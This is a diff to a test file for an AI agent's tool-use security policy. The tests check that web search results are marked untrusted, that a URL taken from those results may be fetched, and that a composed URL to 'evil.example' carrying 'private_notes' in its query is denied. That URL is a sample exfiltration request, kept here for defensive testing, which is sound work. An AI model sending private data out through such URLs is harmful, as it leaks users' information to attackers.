@@ -39,7 +39,7 @@ def test_rule2_and_rule3_after_untrusted_content():
     trust = policy.observe("web_search", prov, "1. https://arxiv.org/abs/2304.08069 — DETRs Beat YOLOs")
     assert trust == Trust.UNTRUSTED and prov.tainted
     # rule 3: only URLs from the results (or from the user); a composed URL with data is blocked
-    assert policy.check("fetch_page", {"url": "https://arxiv.org/abs/2304.08069"}, prov).action == "confirm"  # rule 2
+    assert policy.check("fetch_page", {"url": "https://arxiv.org/abs/2304.08069"}, prov).allowed  # from the results
     d = policy.check("fetch_page", {"url": "https://evil.example/?q=private_notes"}, prov)
     assert (d.action, d.rule) == ("deny", "rule 3")
     # rule 2: external effects after untrusted data need confirmation; reading does not
